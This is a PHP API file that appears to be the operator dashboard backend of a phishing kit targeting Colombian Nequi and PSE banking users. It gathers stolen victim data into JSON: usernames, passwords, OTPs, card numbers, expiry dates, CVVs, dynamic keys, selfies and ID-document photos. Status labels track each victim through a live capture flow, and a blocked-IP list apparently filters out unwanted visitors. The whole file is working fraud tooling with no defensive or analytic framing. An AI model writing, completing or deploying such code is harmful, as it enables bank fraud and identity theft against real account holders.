<?php
// god/api.php
header('Content-Type: application/json');
require_once __DIR__ . '/auth.php'; // Ensure secure access
require_once __DIR__ . '/../config/db.php';

// Helper to map status ID to readable text and color class
function getStatusInfo($status, $type)
{
    // Default
    $info = ['text' => 'Esperando...', 'class' => 'status-badge'];

    // Status definitions
    if ($type === 'nequi') {
        switch ($status) {
            case 1:
                $info = ['text' => '⚠️ Acción Requerida', 'class' => 'status-badge status-waiting'];
                break;
            case 2:
                $info = ['text' => 'Error Login', 'class' => 'status-badge status-error'];
                break;
            case 3:
                $info = ['text' => 'Esperando OTP', 'class' => 'status-badge status-info'];
                break;
            case 4:
                $info = ['text' => 'Error OTP', 'class' => 'status-badge status-warning'];
                break;
            case 6:
                $info = ['text' => 'Esperando Datos', 'class' => 'status-badge status-success'];
                break;
            case 0:
                $info = ['text' => 'Finalizado', 'class' => 'status-badge status-done'];
                break;
        }
    } elseif ($type === 'pse') {
        switch ($status) {
            case 1:
                $info = ['text' => '⚠️ Acción Requerida', 'class' => 'status-badge status-waiting'];
                break;
            case 2:
                $info = ['text' => 'Error Login', 'class' => 'status-badge status-error'];
                break;
            case 3:
                $info = ['text' => 'Cliente en OTP', 'class' => 'status-badge status-info'];
                break;
            case 4:
                $info = ['text' => 'Error OTP', 'class' => 'status-badge status-warning'];
                break;
            case 5:
                $info = ['text' => 'Cliente en CC', 'class' => 'status-badge status-purple'];
                break;
            case 6:
                $info = ['text' => 'Error CC', 'class' => 'status-badge status-error'];
                break;
            case 7:
                $info = ['text' => 'Finalizado', 'class' => 'status-badge status-done'];
                break;
            case 8:
                $info = ['text' => 'En WhatsApp', 'class' => 'status-badge status-info'];
                break;
            case 9:
                $info = ['text' => 'Tomando Selfie', 'class' => 'status-badge status-purple'];
                break;
            case 10:
                $info = ['text' => 'Error Selfie', 'class' => 'status-badge status-error'];
                break;
            case 11:
                $info = ['text' => 'Doc Frente', 'class' => 'status-badge status-purple'];
                break;
            case 12:
                $info = ['text' => 'Doc Reverso', 'class' => 'status-badge status-purple'];
                break;
            case 13:
                $info = ['text' => 'Error Doc Frente', 'class' => 'status-badge status-error'];
                break;
            case 14:
                $info = ['text' => 'Error Doc Reverso', 'class' => 'status-badge status-error'];
                break;
            case 15:
                $info = ['text' => 'En Clave Dinámica', 'class' => 'status-badge status-warning'];
                break;
            case 16:
                $info = ['text' => 'Error Clave Dinámica', 'class' => 'status-badge status-error'];
                break;
        }
    }
    return $info;
}

// Check for actions
if (isset($_GET['action']) && $_GET['action'] === 'get_blocked') {
    try {
        $stmt = $conn->query("SELECT ip FROM blocked_ips ORDER BY created_at DESC");
        $ips = $stmt->fetchAll(PDO::FETCH_COLUMN);
        echo json_encode(['status' => 'success', 'data' => $ips]);
        exit;
    } catch (PDOException $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        exit;
    }
}

try {
    // Fetch Nequi
    $dnequi = [];
    try {
        $stmt = $conn->query("SELECT * FROM nequi ORDER BY id DESC LIMIT 50");
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        foreach ($rows as $r) {
            $st = getStatusInfo($r['estado'], 'nequi');
            $dnequi[] = [
                'id' => $r['id'],
                'type' => 'nequi',
                'bank' => 'Nequi',
                'ip' => $r['ip_address'],
                'user' => $r['usuario'] ?? 'N/A',
                'pass' => $r['clave'] ?? '***',
                'saldo' => $r['saldo'] ?? '',
                'otp' => $r['otp'] ?? '',
                'status_id' => $r['estado'],
                'status_text' => $st['text'],
                'status_class' => $st['class'],
                'date' => $r['created_at'] ?? ''
            ];
        }
    } catch (Exception $e) {
    }

    // Fetch PSE
    $dpse = [];
    try {
        $stmt = $conn->query("SELECT * FROM pse ORDER BY id DESC LIMIT 50");
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        foreach ($rows as $r) {
            $st = getStatusInfo($r['estado'], 'pse');
            $dpse[] = [
                'id' => $r['id'],
                'type' => 'pse',
                'bank' => $r['banco'] ?? 'PSE',
                'ip' => $r['ip_address'] ?? 'sin ip',
                'user' => $r['usuario'] ?? 'N/A', // Holds User
                'email' => $r['email'] ?? '',     // Holds PSE Email
                'pass' => $r['clave'] ?? '***',
                'saldo' => '',
                'otp' => $r['otp'] ?? '',
                'tarjeta' => $r['tarjeta'] ?? '',
                'fecha' => $r['fecha'] ?? '',
                'cvv' => $r['cvv'] ?? '',
                'status_id' => $r['estado'],
                'status_text' => $st['text'],
                'status_class' => $st['class'],
                'date' => $r['created_at'] ?? '',
                // Nuevos campos de fotos
                'foto_selfie' => $r['foto_selfie'] ?? null,
                'foto_front' => $r['foto_front'] ?? null,
                'foto_back' => $r['foto_back'] ?? null
            ];
        }
    } catch (Exception $e) {
    }

    $all = array_merge($dnequi, $dpse);

    // Sort by date desc
    usort($all, function ($a, $b) {
        return strtotime($b['date']) - strtotime($a['date']);
    });

    echo json_encode(['status' => 'success', 'data' => $all]);

} catch (Exception $e) {
    echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
}
?>